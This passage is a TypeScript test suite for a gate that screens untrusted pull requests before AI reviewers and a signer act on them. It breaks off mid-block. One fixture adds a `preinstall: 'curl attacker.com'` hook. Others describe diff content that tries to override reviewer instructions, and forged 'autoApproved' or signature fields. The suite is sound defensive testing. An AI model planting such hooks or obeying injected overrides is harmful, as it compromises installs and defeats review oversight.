/**
 * RFC-0043 Phase 6 — UCVG Conformance Test Suite (AISDLC-502)
 *
 * Comprehensive conformance tests covering:
 *
 * ## RFC-0043 Acceptance Criteria
 *  - AC-1: untrusted PR modifying protected paths blocked by Stage 1 with ZERO LLM/sandbox spend
 *  - AC-2: sandbox cannot read host's high-privilege tokens (credential-withholding invariant)
 *  - AC-3: prompt-injection snippet surfaces as finding, not obeyed; clean-room signer mints valid
 *          attestation only after Zod boundary validates
 *
 * ## OQ Resolution verification (hermetic)
 *  - OQ-1 (trust source): static file is authoritative; no live API calls on critical path
 *  - OQ-2 (deployment mode): CI default; local opt-in wired correctly in config
 *  - OQ-3 (resource limits): configurable defaults; hard-abort on breach
 *  - OQ-4 (Sigstore deferral): operator-key Merkle ONLY; Stage A counter shape
 *  - OQ-5 (driver defaults): Docker default; HIPAA/FedRAMP/PCI-DSS Level 1 → MicroVM
 *  - OQ-6 (heuristic boundary): current allowlist only; new patterns via Decision Catalog
 *
 * ## End-to-end synthetic untrusted PR scenarios
 *  - (a) Clean source change → Stage 1 pass
 *  - (b) Protected-path mutation → Stage 1 abort
 *  - (c) Resource exhaustion shape → Stage 3 abort
 *  - (d) Injection attempt → Stage 3 finding surfaced (not obeyed)
 *
 * ## Hygiene rules (from task brief)
 *  - All tests use mkdtempSync isolated dirs; never write to shared /tmp/.ai-sdlc/
 *  - No internal tracker IDs (AISDLC-NNN) in GitHub-posted strings tested here
 *  - All new TS source tested to ≥80% patch coverage
 */

import { describe, expect, it, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// Stage 0 — Trust Classifier
import { classifyTrust, shouldEngageUcvg, loadAllowlistedAuthors } from './trust-classifier.js';

// Stage 1 — AST Gate
import {
  runAstGate,
  buildBlockedComment,
  buildBlockedEvent,
  normalizePath,
  globToRegex,
  matchesAnyGlob,
  detectLifecycleScriptAdditions,
  detectNewGithubActionUses,
  DEFAULT_PROTECTED_PATHS,
  DEFAULT_ALLOWED_MUTATION_GLOBS,
  STAGE_1_HEURISTIC_REQUEST_DECISION_SUMMARY,
  type ChangedFile,
} from './ast-gate.js';
import {
  SANDBOX_ARTIFACT_SENTINELS,
  detectSandboxArtifacts,
  runCleanRoomSigner,
} from './clean-room-signer.js';

// Stage 3 (sandbox runner types + resource limits)
import {
  resolveEffectiveDriver,
  loadSandboxConfig,
  DEFAULT_RESOURCE_LIMITS,
  DEFAULT_SANDBOX_CONFIG,
  buildResourceBreachEvent,
  type ResourceBreachType,
} from './sandbox-runner.js';

// Stage 4 — Report Validator (Zod boundary)
import { validateReport, SIGSTORE_ANCHOR_REQUEST_DECISION_SUMMARY } from './report-validator.js';
import type { UntrustedPrReport } from './report-validator.js';

// ── Shared fixtures ────────────────────────────────────────────────────────────

/** A valid minimal UntrustedPrReport for use as a base in mutation tests. */
const VALID_REPORT: UntrustedPrReport = {
  schemaVersion: 'untrusted-pr-report.v1',
  prNumber: 42,
  headSha: 'a'.repeat(40),
  baseSha: 'b'.repeat(40),
  generatedAt: '2026-06-02T10:00:00.000Z',
  trust: { classification: 'untrusted', reason: 'author-not-in-allowlist' },
  astGate: { outcome: 'pass', offendingPaths: [] },
  differentialTest: {
    upstreamSuitePassed: true,
    newTestsPassed: true,
    newCodeCoveragePct: 87.5,
  },
  reviewers: {
    code: { approved: true, findings: [], promptInjectionDetected: false },
    test: { approved: true, findings: [], promptInjectionDetected: false },
    security: { approved: true, findings: [], promptInjectionDetected: false },
  },
  consensus: { approved: true, blockingFindings: 0 },
};

const TRUSTED_REVIEWERS_YAML = `
reviewers:
  - identity: 'test@example.com'
    machine: 'test-machine'
    addedAt: '2026-01-01'
    addedBy: 'admin'
    pubkey: |
      -----BEGIN PUBLIC KEY-----
      MCowBQYDK2VwAyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
      -----END PUBLIC KEY-----

allowlist:
  authors:
    - login: alice
      name: Alice Smith
      addedAt: '2026-06-01'
      addedBy: admin
    - login: bob
      name: Bob Jones
      addedAt: '2026-06-02'
      addedBy: admin
`;

// ── Isolated temp-dir helpers ──────────────────────────────────────────────────

function mkTmpDir(): string {
  return mkdtempSync(join(tmpdir(), 'ucvg-conformance-'));
}

// ── AC-1: Protected-path mutation blocked with ZERO LLM/sandbox spend ─────────

describe('RFC-0043 AC-1 — protected-path mutation blocked by Stage 1 (zero LLM/sandbox spend)', () => {
  it('blocks .github/** mutation immediately', () => {
    const files: ChangedFile[] = [{ path: '.github/workflows/ci.yml', status: 'modified' }];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
    expect(result.offendingPaths).toContain('.github/workflows/ci.yml');
  });

  it('blocks package.json mutation immediately', () => {
    const files: ChangedFile[] = [{ path: 'package.json', status: 'modified' }];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
    expect(result.offendingPaths).toContain('package.json');
  });

  it('blocks pnpm-lock.yaml mutation immediately', () => {
    const files: ChangedFile[] = [{ path: 'pnpm-lock.yaml', status: 'modified' }];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
  });

  it('blocks .ai-sdlc/** mutation immediately', () => {
    const files: ChangedFile[] = [{ path: '.ai-sdlc/agent-role.yaml', status: 'modified' }];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
  });

  it('blocks ai-sdlc-plugin/agents/** mutation immediately', () => {
    const files: ChangedFile[] = [
      { path: 'ai-sdlc-plugin/agents/code-reviewer.md', status: 'modified' },
    ];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
  });

  it('collects ALL offending paths before returning (no short-circuit)', () => {
    const files: ChangedFile[] = [
      { path: '.github/workflows/ci.yml', status: 'modified' },
      { path: 'pnpm-lock.yaml', status: 'modified' },
      { path: 'src/index.ts', status: 'modified' }, // allowed
    ];
    const result = runAstGate(files);
    expect(result.outcome).toBe('abort-protected-path');
    expect(result.offendingPaths).toContain('.github/workflows/ci.yml');
    expect(result.offendingPaths).toContain('pnpm-lock.yaml');
    // The allowed file should NOT appear in offendingPaths
    expect(result.offendingPaths).not.toContain('src/index.ts');
  });

  it('passes for pure TypeScript source changes', () => {
    const files: ChangedFile[] = [
      { path: 'src/feature.ts', status: 'added' },
      { path: 'src/feature.test.ts', status: 'added' },
    ];
    const result = runAstGate(files);
    expect(result.outcome).toBe('pass');
    expect(result.offendingPaths).toHaveLength(0);
  });

  it('passes for documentation-only changes', () => {
    const files: ChangedFile[] = [
      { path: 'docs/guide.md', status: 'modified' },
      { path: 'README.md', status: 'modified' },
    ];
    const result = runAstGate(files);
    expect(result.outcome).toBe('pass');
  });

  it('posts comment that does not contain internal tracker IDs (AISDLC-NNN)', () => {
    const gateResult = runAstGate([{ path: '.github/workflows/ci.yml', status: 'modified' }]);
    const comment = buildBlockedComment(gateResult, 'external-contrib');
    // Adopter-facing string gate: no AISDLC-NNN IDs in posted content
    expect(comment).not.toMatch(/AISDLC-\d+/);
    expect(comment).toContain('needs-maintainer-review');
    expect(comment).toContain('@external-contrib');
  });

  it('blocked event does not contain internal tracker IDs', () => {
    const gateResult = runAstGate([{ path: 'package.json', status: 'modified' }]);
    const event = buildBlockedEvent(42, 'external-contrib', gateResult);
    const eventStr = JSON.stringify(event);
    expect(eventStr).not.toMatch(/AISDLC-\d+/);
    expect(event.type).toBe('UntrustedPrBlockedByProtectedPath');
    expect(event.label).toBe('needs-maintainer-review');
  });
});

// ── AC-2: Sandbox credential-withholding invariant ────────────────────────────

describe('RFC-0043 AC-2 — sandbox cannot read host high-privilege tokens (credential withholding)', () => {
  it('clean-room signer detects active sandbox sentinels and refuses to run', () => {
    const tmpDir = mkTmpDir();
    try {
      // Simulate an active sandbox environment by creating a sentinel file
      writeFileSync(join(tmpDir, 'untrusted-pr-eval-active'), 'pid=12345');
      const found = detectSandboxArtifacts(tmpDir);
      // detectSandboxArtifacts returns the sentinel name found, or null if clean
      expect(found).toBe('untrusted-pr-eval-active');
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('clean-room signer confirms isolation in clean environment', () => {
    const tmpDir = mkTmpDir();
    try {
      const found = detectSandboxArtifacts(tmpDir);
      expect(found).toBeNull();
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('detects .sandbox-pid sentinel', () => {
    const tmpDir = mkTmpDir();
    try {
      writeFileSync(join(tmpDir, '.sandbox-pid'), '99999');
      const found = detectSandboxArtifacts(tmpDir);
      expect(found).toBe('.sandbox-pid');
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('detects stages-1-3-output sentinel directory', () => {
    const tmpDir = mkTmpDir();
    try {
      mkdirSync(join(tmpDir, 'stages-1-3-output'));
      const found = detectSandboxArtifacts(tmpDir);
      expect(found).toBe('stages-1-3-output');
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('SANDBOX_ARTIFACT_SENTINELS covers all known sentinel names', () => {
    const expected = [
      'untrusted-pr-eval-active',
      'stages-1-3-output',
      'sandbox-output',
      '.sandbox-pid',
      'untrusted-pr-eval.lock',
    ];
    for (const sentinel of expected) {
      expect(SANDBOX_ARTIFACT_SENTINELS).toContain(sentinel);
    }
  });

  it('withheld credential names are not in DEFAULT sandbox env (type-level assertion)', () => {
    // The SandboxSpawnInput interface documents which secrets MUST NOT appear.
    // This test verifies the default config does NOT inadvertently include env vars
    // that should be withheld — by checking that DEFAULT_SANDBOX_CONFIG has no
    // sandboxEnv that would carry these credentials.
    const config = DEFAULT_SANDBOX_CONFIG;
    // Default config should not have sandboxEnv set
    expect(config).not.toHaveProperty('sandboxEnv');
  });
});

// ── AC-3: Prompt injection surfaces as finding; signer validates before signing ─

describe('RFC-0043 AC-3 — prompt injection → finding; clean-room signer validates before signing', () => {
  it('validateReport rejects report before key is touched when schema is invalid', () => {
    const tampered = { ...VALID_REPORT, schemaVersion: 'injected-version' };
    const result = validateReport(tampered);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.error).toContain('schemaVersion');
    }
  });

  it('validateReport accepts a valid report with promptInjectionDetected:true', () => {
    // A report where injection was detected but the signer can still attest
    // (the content is correct; the FINDING is the signal for the operator)
    const withInjection: UntrustedPrReport = {
      ...VALID_REPORT,
      reviewers: {
        ...VALID_REPORT.reviewers,
        security: {
          approved: false,
          findings: [
            {
              severity: 'critical',
              message:
                'prompt-injection-attempt: diff content attempted to manipulate reviewer output',
              path: 'src/utils/helpers.ts',
            },
          ],
          promptInjectionDetected: true,
        },
      },
      consensus: { approved: false, blockingFindings: 1 },
    };
    // The report itself is schema-valid (injection is a finding, not malformed data)
    const result = validateReport(withInjection);
    expect(result.valid).toBe(true);
  });

  it('validateReport rejects when promptInjectionDetected field is missing', () => {
    // The field is REQUIRED — the sandbox MUST always emit it
    const { promptInjectionDetected: _pid, ...codeWithoutField } = VALID_REPORT.reviewers.code;
    void _pid;
    const malformed = {
      ...VALID_REPORT,
      reviewers: {
        ...VALID_REPORT.reviewers,
        code: codeWithoutField,
      },
    };
    const result = validateReport(malformed as unknown);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.error).toContain('promptInjectionDetected');
    }
  });

  it('validateReport rejects extra injected keys at trust boundary (strict Zod)', () => {
    // An attacker tries to add a `signature` field to bypass validation
    const tampered = {
      ...VALID_REPORT,
      reviewers: {
        ...VALID_REPORT.reviewers,
        security: {
          ...VALID_REPORT.reviewers.security,
          signature: 'fake-sig', // injected key
        },
      },
    };
    const result = validateReport(tampered as unknown);
    expect(result.valid).toBe(false);
  });

  it('signer refuses to sign when consensus.approved is false (injection found)', () => {
    // Simulate a report where the security reviewer detected injection
    const reportWithInjection: UntrustedPrReport = {
      ...VALID_REPORT,
      reviewers: {
        ...VALID_REPORT.reviewers,
        security: {
          approved: false,
          findings: [
            {
              severity: 'critical',
              message: 'prompt-injection-attempt: ignored prior instructions',
            },
          ],
          promptInjectionDetected: true,
        },
      },
      consensus: { approved: false, blockingFindings: 1 },
    };

    // The report validates at the Zod boundary (injection is a finding, not malformed)
    const validationResult = validateReport(reportWithInjection);
    expect(validationResult.valid).toBe(true);

    // Now exercise the real runCleanRoomSigner() to confirm the signer-refusal path.
    // Use an isolated mkdtemp work dir with no sandbox sentinels and no signing key,
    // so the signer progresses through isolation-check + Zod + consensus gate
    // and fails at consensus-rejected BEFORE ever attempting key resolution.
    const tmpDir = mkdtempSync(join(tmpdir(), 'ucvg-conformance-signer-'));
    try {
      // Write the report artifact into the isolated tmpDir
      const reportsDir = join(tmpDir, '.ai-sdlc', 'ucvg', 'reports');
      mkdirSync(reportsDir, { recursive: true });
      const reportPath = join(reportsDir, '42.unsigned.json');
      writeFileSync(reportPath, JSON.stringify(reportWithInjection), 'utf8');

      const result = runCleanRoomSigner({
        reportArtifactPath: reportPath,
        repoRoot: tmpDir,
        taskId: 'AISDLC-504',
        headSha: 'a'.repeat(40), // matches VALID_REPORT.headSha
        workDir: tmpDir, // no sandbox sentinels → isolation check passes
      });

      // The signer MUST refuse at the consensus gate, never reaching key-resolution
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.phase).toBe('consensus-rejected');
        expect(result.error).toContain('[clean-room-signer]');
        expect(result.error).toContain('consensus.approved');
      }
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

// ── OQ-1: Static file is authoritative; no live API on critical path ───────────

describe('RFC-0043 OQ-1 — trust source is static file (no live GitHub API)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkTmpDir();
    mkdirSync(join(tmpDir, '.ai-sdlc'));
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('classifyTrust reads from static file only (alice trusted)', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'), TRUSTED_REVIEWERS_YAML);
    const result = classifyTrust({
      author: 'alice',
      isFork: true,
      reviewerAuthorityModel: 'allowlist',
      workDir: tmpDir,
    });
    expect(result.classification).toBe('trusted');
    expect(result.reason).toBe('author-in-allowlist');
  });

  it('classifyTrust treats unknown author as untrusted (allowlist model)', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'), TRUSTED_REVIEWERS_YAML);
    const result = classifyTrust({
      author: 'charlie-unknown',
      isFork: false,
      reviewerAuthorityModel: 'allowlist',
      workDir: tmpDir,
    });
    expect(result.classification).toBe('untrusted');
    expect(result.reason).toBe('author-not-in-allowlist');
  });

  it('classifyTrust treats fork PR as untrusted when not in allowlist', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'), TRUSTED_REVIEWERS_YAML);
    const result = classifyTrust({
      author: 'dave-fork',
      isFork: true,
      reviewerAuthorityModel: 'allowlist',
      workDir: tmpDir,
    });
    expect(result.classification).toBe('untrusted');
    expect(result.reason).toBe('fork-pr-always-untrusted');
  });

  it('classifyTrust treats everyone as trusted in open model (UCVG opt-in)', () => {
    // No file needed — open model short-circuits before file read
    const result = classifyTrust({
      author: 'anyone',
      isFork: true,
      reviewerAuthorityModel: 'open',
      workDir: tmpDir,
    });
    expect(result.classification).toBe('trusted');
    expect(result.reason).toBe('reviewerAuthorityModel-open');
  });

  it('shouldEngageUcvg returns false for open model (UCVG opt-in only)', () => {
    const result = classifyTrust({
      author: 'anyone',
      isFork: false,
      reviewerAuthorityModel: 'open',
      workDir: tmpDir,
    });
    expect(shouldEngageUcvg(result)).toBe(false);
  });

  it('shouldEngageUcvg returns true for untrusted author in allowlist model', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'), TRUSTED_REVIEWERS_YAML);
    const result = classifyTrust({
      author: 'unknown-external',
      isFork: false,
      reviewerAuthorityModel: 'allowlist',
      workDir: tmpDir,
    });
    expect(shouldEngageUcvg(result)).toBe(true);
  });

  it('login comparison is case-insensitive (GitHub logins are case-insensitive)', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'), TRUSTED_REVIEWERS_YAML);
    // alice is in the allowlist as lowercase; test with uppercase
    const result = classifyTrust({
      author: 'Alice',
      isFork: false,
      reviewerAuthorityModel: 'allowlist',
      workDir: tmpDir,
    });
    expect(result.classification).toBe('trusted');
  });

  it('returns empty allowlist when trusted-reviewers.yaml is absent', () => {
    // No file written in this tmpDir
    const authors = loadAllowlistedAuthors(tmpDir);
    expect(authors).toHaveLength(0);
  });

  it('returns empty allowlist when file has no allowlist block', () => {
    writeFileSync(
      join(tmpDir, '.ai-sdlc', 'trusted-reviewers.yaml'),
      'reviewers:\n  - identity: test@example.com\n',
    );
    const authors = loadAllowlistedAuthors(tmpDir);
    expect(authors).toHaveLength(0);
  });
});

// ── OQ-2: CI default deployment; local opt-in ─────────────────────────────────

describe('RFC-0043 OQ-2 — CI default deployment; local opt-in', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkTmpDir();
    mkdirSync(join(tmpDir, '.ai-sdlc'));
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('default sandbox config uses CI deployment mode', () => {
    expect(DEFAULT_SANDBOX_CONFIG.deployment).toBe('ci');
  });

  it('loads ci deployment mode from config file', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), 'deployment: ci\n');
    const config = loadSandboxConfig(tmpDir);
    expect(config.deployment).toBe('ci');
  });

  it('loads local deployment mode from config file', () => {
    writeFileSync(join(tmpDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), 'deployment: local\n');
    const config = loadSandboxConfig(tmpDir);
    expect(config.deployment).toBe('local');
  });

  it('falls back to default (ci) when config file is absent', () => {
    const config = loadSandboxConfig(tmpDir);
    expect(config.deployment).toBe('ci');
  });
});

// ── OQ-3: Configurable resource limits; hard-abort shape ──────────────────────

describe('RFC-0043 OQ-3 — resource limits: configurable defaults + hard-abort', () => {
  it('default limits match OQ-3 resolution values', () => {
    expect(DEFAULT_RESOURCE_LIMITS.wallClockSeconds).toBe(600); // 10 min
    expect(DEFAULT_RESOURCE_LIMITS.cpuCores).toBe(2);
    expect(DEFAULT_RESOURCE_LIMITS.memoryMb).toBe(4096); // 4 GB
    // Network: deny is enforced at the OpenShell driver layer, not in ResourceLimits
  });

  it('loads custom resource limits from config', () => {
    const tmpDir = mkTmpDir();
    mkdirSync(join(tmpDir, '.ai-sdlc'));
    try {
      writeFileSync(
        join(tmpDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'),
        [
          'differentialTest:',
          '  resourceLimits:',
          '    wallClockSeconds: 1200',
          '    cpuCores: 4',
          '    memoryMb: 8192',
          '    perTestTimeoutSeconds: 120',
        ].join('\n'),
      );
      const config = loadSandboxConfig(tmpDir);
      expect(config.differentialTest.resourceLimits.wallClockSeconds).toBe(1200);
      expect(config.differentialTest.resourceLimits.cpuCores).toBe(4);
      expect(config.differentialTest.resourceLimits.memoryMb).toBe(8192);
      expect(config.differentialTest.resourceLimits.perTestTimeoutSeconds).toBe(120);
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('rejects non-positive limit values (falls back to defaults)', () => {
    const tmpDir = mkTmpDir();
    mkdirSync(join(tmpDir, '.ai-sdlc'));
    try {
      writeFileSync(
        join(tmpDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'),
        'differentialTest:\n  resourceLimits:\n    wallClockSeconds: -1\n',
      );
      const config = loadSandboxConfig(tmpDir);
      // -1 should fall back to the default (parser rejects non-positive)
      expect(config.differentialTest.resourceLimits.wallClockSeconds).toBe(600);
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

// ── OQ-4: Sigstore deferral; Stage A counter ──────────────────────────────────

describe('RFC-0043 OQ-4 — Sigstore deferral; operator-key Merkle ONLY for v1', () => {
  it('SIGSTORE_ANCHOR_REQUEST_DECISION_SUMMARY has correct value', () => {
    // The string MUST NOT contain AISDLC-NNN (adopter-facing-strings gate)
    expect(SIGSTORE_ANCHOR_REQUEST_DECISION_SUMMARY).toBe('untrusted-pr-sigstore-anchor-request');
    expect(SIGSTORE_ANCHOR_REQUEST_DECISION_SUMMARY).not.toMatch(/AISDLC-\d+/);
  });

  it('operator-key Merkle model does not require Sigstore in v1 (schema has no sigstore field)', () => {
    // The schema does not contain any Sigstore-specific field — verify by checking
    // that a valid report without any Sigstore data passes validation
    const result = validateReport(VALID_REPORT);
    expect(result.valid).toBe(true);
    // And that adding a sigstore field is REJECTED (strict Zod)
    const withSigstore = { ...VALID_REPORT, sigstoreBundle: { rekorLogId: 'abc' } };
    const rejected = validateReport(withSigstore as unknown);
    expect(rejected.valid).toBe(false);
  });
});

// ── OQ-5: Docker default; HIPAA/FedRAMP/PCI → MicroVM ────────────────────────

describe('RFC-0043 OQ-5 — driver defaults: Docker default; regime → MicroVM override', () => {
  it('default sandbox driver is docker', () => {
    expect(DEFAULT_SANDBOX_CONFIG.sandboxDriver).toBe('docker');
  });

  it('resolveEffectiveDriver returns docker for "none" regime', () => {
    const result = resolveEffectiveDriver('docker', 'none');
    expect(result.driver).toBe('docker');
    expect(result.overrideApplied).toBe(false);
  });

  it('resolveEffectiveDriver upgrades to microvm for HIPAA', () => {
    const result = resolveEffectiveDriver('docker', 'hipaa');
    expect(result.driver).toBe('microvm');
    expect(result.overrideApplied).toBe(true);
    expect(result.overrideReason).toContain('hipaa');
  });

  it('resolveEffectiveDriver upgrades to microvm for fedramp-high', () => {
    const result = resolveEffectiveDriver('kata', 'fedramp-high');
    expect(result.driver).toBe('microvm');
    expect(result.overrideApplied).toBe(true);
  });

  it('resolveEffectiveDriver upgrades to microvm for pci-dss-level-1', () => {
    const result = resolveEffectiveDriver('gvisor', 'pci-dss-level-1');
    expect(result.driver).toBe('microvm');
    expect(result.overrideApplied).toBe(true);
  });

  it('resolveEffectiveDriver does not override when microvm already selected', () => {
    const result = resolveEffectiveDriver('microvm', 'hipaa');
    expect(result.driver).toBe('microvm');
    expect(result.overrideApplied).toBe(false);
    expect(result.overrideReason).toBeUndefined();
  });

  it('loads sandboxDriver from config', () => {
    const tmpDir = mkTmpDir();
    mkdirSync(join(tmpDir, '.ai-sdlc'));
    try {
      writeFileSync(join(tmpDir, '.ai-sdlc', 'untrusted-pr-gate.yaml'), 'sandboxDriver: kata\n');
      const config = loadSandboxConfig(tmpDir);
      expect(config.sandboxDriver).toBe('kata');
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

// ── OQ-6: Content-heuristic boundary (current allowlist; Decision Catalog for new) ─

describe('RFC-0043 OQ-6 — content-heuristic boundary: allowlist + Decision Catalog for additions', () => {
  it('detects postinstall lifecycle script addition', () => {
    const before = JSON.stringify({ scripts: {} });
    const after = JSON.stringify({ scripts: { postinstall: 'node setup.js' } });
    const added = detectLifecycleScriptAdditions(after, before);
    expect(added).toContain('postinstall');
  });

  it('detects preinstall lifecycle script addition', () => {
    const before = JSON.stringify({ scripts: { build: 'tsc' } });
    const after = JSON.stringify({ scripts: { build: 'tsc', preinstall: 'curl attacker.com' } });
    const added = detectLifecycleScriptAdditions(after, before);
    expect(added).toContain('preinstall');
  });

  it('does NOT flag preinstall that was already present (no false positive)', () => {
    const before = JSON.stringify({ scripts: { preinstall: 'node setup.js' } });
    const after = JSON.stringify({ scripts: { preinstall: 'node setup.js', test: 'vitest' } });
    const added = detectLifecycleScriptAdditions(after, before);
    // No change to preinstall — should not be flagged
    expect(added).not.toContain('preinstall');
  });

  it('detects new uses: reference in workflow YAML content', () => {
    const before = '';
    const after = '- uses: actions/checkout@v4\n  with:\n    ref: main';
    const detected = detectNewGithubActionUses(after, before);
    expect(detected).toBe(true);
  });

  it('does NOT flag existing uses: line that did not change (no false positive)', () => {
    const sharedContent = '- uses: actions/checkout@v4\n';
    const detected = detectNewGithubActionUses(sharedContent, sharedContent);
    expect(detected).toBe(false);
  });

  it('STAGE_1_HEURISTIC_REQUEST_DECISION_SUMMARY does not contain tracker IDs', () => {
    // Verify the Decision Catalog summary string is adopter-facing clean
    expect(STAGE_1_HEURISTIC_REQUEST_DECISION_SUMMARY).toBe(
      'stage-1-content-heuristic-addition-request',
    );
    expect(STAGE_1_HEURISTIC_REQUEST_DECISION_SUMMARY).not.toMatch(/AISDLC-\d+/);
  });
});

// ── End-to-end synthetic scenarios ────────────────────────────────────────────

describe('RFC-0043 E2E — synthetic untrusted PR scenarios', () => {
  describe('(a) Clean source change → Stage 1 pass', () => {
    it('full e2e: clean .ts change passes Stage 1 and validates in report', () => {
      // Stage 1: run the gate
      const files: ChangedFile[] = [
        { path: 'src/new-feature.ts', status: 'added' },
        { path: 'src/new-feature.test.ts', status: 'added' },
        { path: 'docs/new-feature.md', status: 'added' },
      ];
      const gateResult = runAstGate(files);
      expect(gateResult.outcome).toBe('pass');

      // Simulate report production after stages 2-3
      const report: UntrustedPrReport = {
        ...VALID_REPORT,
        astGate: { outcome: 'pass', offendingPaths: [] },
      };
      const validationResult = validateReport(report);
      expect(validationResult.valid).toBe(true);
      if (validationResult.valid) {
        expect(validationResult.report.consensus.approved).toBe(true);
      }
    });
  });

  describe('(b) Protected-path mutation → Stage 1 abort', () => {
    it('full e2e: workflow file change → gate aborts, report would reflect abort', () => {
      const files: ChangedFile[] = [
        { path: '.github/workflows/untrusted-pr-gate.yml', status: 'modified' },
        { path: 'src/legit-feature.ts', status: 'added' },
      ];
      const gateResult = runAstGate(files);
      expect(gateResult.outcome).toBe('abort-protected-path');
      expect(gateResult.offendingPaths).toContain('.github/workflows/untrusted-pr-gate.yml');

      // A report produced after Stage 1 abort would reflect the abort
      const report: UntrustedPrReport = {
        ...VALID_REPORT,
        astGate: {
          outcome: 'abort-protected-path',
          offendingPaths: ['.github/workflows/untrusted-pr-gate.yml'],
        },
        consensus: { approved: false, blockingFindings: 1 },
      };
      const validationResult = validateReport(report);
      // The report schema is valid even for an abort report
      expect(validationResult.valid).toBe(true);
      if (validationResult.valid) {
        // But the signer would refuse to sign since consensus.approved is false
        expect(validationResult.report.consensus.approved).toBe(false);
      }
    });
  });

  describe('(c) Resource exhaustion → abort shape', () => {
    it('resource breach event shape is correct for wall-clock exhaustion', () => {
      // Call the real factory from sandbox-runner.ts — this exercises production
      // code rather than asserting on a hand-constructed plain object literal.
      const breachType: ResourceBreachType = 'wall-clock';
      const prNumber = 99;
      const limitSeconds = DEFAULT_RESOURCE_LIMITS.wallClockSeconds; // 600
      const now = new Date('2026-06-02T10:00:00.000Z');
      const event = buildResourceBreachEvent(
        prNumber,
        breachType,
        limitSeconds,
        'seconds',
        undefined,
        now,
      );

      // Assert on the real factory output fields
      expect(event.type).toBe('ResourceBreach');
      expect(event.breachType).toBe('wall-clock');
      expect(event.prNumber).toBe(prNumber);
      expect(event.limit).toBe(limitSeconds);
      expect(event.limitUnit).toBe('seconds');
      expect(event.ts).toBe(now.toISOString());
      // The event does NOT contain internal tracker IDs
      expect(JSON.stringify(event)).not.toMatch(/AISDLC-\d+/);
    });

    it('a DoS-exhausted report has consensus.approved false (signer would refuse)', () => {
      const dosReport: UntrustedPrReport = {
        ...VALID_REPORT,
        differentialTest: {
          upstreamSuitePassed: false, // exhausted before completing
          newTestsPassed: false,
          newCodeCoveragePct: 0,
        },
        reviewers: {
          code: {
            approved: false,
            findings: [{ severity: 'critical', message: 'Tests timed out' }],
            promptInjectionDetected: false,
          },
          test: {
            approved: false,
            findings: [{ severity: 'critical', message: 'Tests timed out' }],
            promptInjectionDetected: false,
          },
          security: {
            approved: false,
            findings: [{ severity: 'critical', message: 'Tests timed out' }],
            promptInjectionDetected: false,
          },
        },
        consensus: { approved: false, blockingFindings: 3 },
      };
      const result = validateReport(dosReport);
      expect(result.valid).toBe(true);
      if (result.valid) {
        expect(result.report.consensus.approved).toBe(false);
      }
    });
  });

  describe('(d) Prompt injection attempt → finding surfaced (not obeyed)', () => {
    it('injection finding is correctly shaped in the report', () => {
      const injectionReport: UntrustedPrReport = {
        ...VALID_REPORT,
        reviewers: {
          ...VALID_REPORT.reviewers,
          security: {
            approved: false,
            findings: [
              {
                severity: 'critical',
                message:
                  'prompt-injection-attempt: diff comment attempted to override reviewer instructions',
                path: 'src/utils/parser.ts',
              },
            ],
            promptInjectionDetected: true,
          },
        },
        consensus: { approved: false, blockingFindings: 1 },
      };

      const result = validateReport(injectionReport);
      // Schema validates correctly — finding is data, not instruction
      expect(result.valid).toBe(true);
      if (result.valid) {
        expect(result.report.reviewers.security.promptInjectionDetected).toBe(true);
        expect(result.report.reviewers.security.findings[0].severity).toBe('critical');
        // The finding is surfaced, not obeyed — consensus is false (not auto-approved)
        expect(result.report.consensus.approved).toBe(false);
      }
    });

    it('injection attempt does NOT cause schema bypass (strict Zod catches injected keys)', () => {
      // An attacker tries to inject an `approved: true` field alongside the finding
      // to trick the signer into thinking the report is approved
      const tampered = {
        ...VALID_REPORT,
        reviewers: {
          ...VALID_REPORT.reviewers,
          security: {
            approved: false,
            findings: [],
            promptInjectionDetected: true,
            // Injected: attacker tries to add a field to spoof approval
            autoApproved: true,
          },
        },
      };
      const result = validateReport(tampered as unknown);
      // Strict Zod rejects the extra field
      expect(result.valid).toBe(false);
    });
  });
});

// ── Report schema integrity ────────────────────────────────────────────────────

describe('RFC-0043 report schema integrity', () => {
  it('validates a fully-formed valid report', () => {
    const result = validateReport(VALID_REPORT);
    expect(result.valid).toBe(true);
  });

  it('rejects report with wrong schemaVersion literal', () => {
    const result = validateReport({ ...VALID_REPORT, schemaVersion: 'untrusted-pr-report.v2' });
    expect(result.valid).toBe(false);
  });

